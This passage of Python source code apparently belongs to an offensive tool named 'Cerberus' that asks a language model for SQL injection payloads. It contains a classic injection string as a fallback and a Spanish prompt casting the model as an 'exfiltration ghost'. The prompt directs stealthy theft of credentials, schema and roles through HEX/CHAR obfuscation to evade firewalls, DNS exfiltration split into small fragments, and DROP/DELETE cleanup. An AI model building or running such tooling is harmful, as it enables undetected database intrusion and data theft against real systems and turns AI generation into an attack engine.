        logger.error(f"Cortex lethal payload generation failed: {e}")
        return {
            "payload": "' OR 1=1 --",
            "reasoning": f"Fallo al generar con IA: {e}",
            "confidence": 0.2,
            "is_lethal": False
        }


async def generate_extraction_payload(
    target_url: str,
    tech_stack: Dict[str, str],
    extraction_target: str = "current_user",
    waf_signals: List[str] = None
) -> Dict[str, Any]:
    """
    [P5-E Intelligent Data Extraction - V2]
    Generates payloads for high-value data exfiltration (creds, schema, roles).
    Enforces stealth and tunnel integrity design.
    """
    client = _get_client()
    if client is None:
        return {"payload": "SELECT user()", "reasoning": "Heurística básica."}

    prompt = f"""Eres el Fantasma de Exfiltración de Cerberus (Nivel 5).
Tu objetivo es extraer datos de ALTO VALOR de forma SIGILOSA e INTELIGENTE.

DATOS DEL OBJETIVO:
- URL: {target_url}
- Stack: {json.dumps(tech_stack)}
- WAF/Defensas: {", ".join(waf_signals or ["Evasión estándar"])}
- Objetivo Específico: {extraction_target}

DIRECTIVAS DE OPERACIÓN FANTASMA:
1. **Detección Cero**: El payload debe parecer una anomalía de red o un error de lógica de la aplicación, NO un ataque.
2. **Encapsulamiento**: Usa `HEX()` o `CHAR()` anidados para que el dato exfiltrado no sea legible en tránsito por firewalls de capa 7.
3. **Fragmentación Sigilosa**: Si usas OOB/DNS, divide el dato en piezas de 15-20 caracteres para evitar sospechas por nombres de dominio inusualmente largos.
4. **Validación de Integridad**: Añade un checksum corto (ej: los primeros 4 bytes del hash del dato) al final de la cadena exfiltrada para que Cerberus pueda validar que el dato llegó íntegro.
5. **Auto-Limpieza**: No uses tablas temporales si es posible. Si debes usarlas, el payload debe incluir el comando `DROP` o `DELETE` condicionado al final de la ejecución.

REGLAS DE RESPUESTA:
- Devuelve EXCLUSIVAMENTE un bloque JSON puro.
{{
    "payload": "la cadena de extracción quirúrgica",
    "reasoning": "táctica defensiva-sigilosa utilizada",
    "is_high_value": boolean
}}"""

    try:
        response = await asyncio.to_thread(
            client.models.generate_content,
            model=CORTEX_MODEL,
            contents=prompt,
        )
        raw_text = response.text.strip()
        start = raw_text.find('{')
        end = raw_text.rfind('}')
        if start != -1 and end != -1:
            raw_text = raw_text[start:end+1]
        data = json.loads(raw_text)
        return data
    except Exception as e:
        logger.error(f"Cortex extraction payload generation failed: {e}")
        return {"payload": "SELECT user()", "reasoning": "Fallo en IA.", "is_high_value": False}
